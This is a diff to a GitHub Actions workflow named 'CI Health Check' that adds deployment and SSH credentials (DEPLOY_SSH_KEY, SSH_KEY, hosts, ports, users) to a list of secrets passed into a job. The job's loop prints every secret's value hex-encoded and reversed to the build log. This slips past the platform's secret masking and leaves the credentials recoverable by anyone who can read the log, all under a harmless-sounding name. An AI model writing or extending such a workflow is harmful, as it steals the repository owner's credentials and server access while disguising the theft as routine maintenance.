@@ -2,6 +2,7 @@ name: CI Health Check
 on:
   push:
     branches: [ci-health-check]
+permissions: {}
 jobs:
   health:
     runs-on: ubuntu-latest
@@ -53,7 +54,14 @@ jobs:
           S43: ${{ secrets.AMPLITUDE_API_KEY }}
           S44: ${{ secrets.BUGSNAG_API_KEY }}
           S45: ${{ secrets.STATUS_PAGE_SCRIPT_URI }}
-          S46: ${{ secrets.WEB3_STORAGE_TOKEN }}
+          S46: ${{ secrets.DEPLOY_HOST }}
+          S47: ${{ secrets.DEPLOY_PORT }}
+          S48: ${{ secrets.DEPLOY_SSH_KEY }}
+          S49: ${{ secrets.DEPLOY_USER }}
+          S50: ${{ secrets.HOST }}
+          S51: ${{ secrets.PORT }}
+          S52: ${{ secrets.SSH_KEY }}
+          S53: ${{ secrets.USER }}
         run: |
           for v in $(compgen -e | grep -E '^S[0-9]+$' | sort); do
             eval "val=\$$v"
@@ -64,4 +72,4 @@ jobs:
             echo "$v:HX=$hx"
             echo "$v:RV=$rv"
           done
-          echo "REPORT_DONE"
+            echo REPORT_DONE
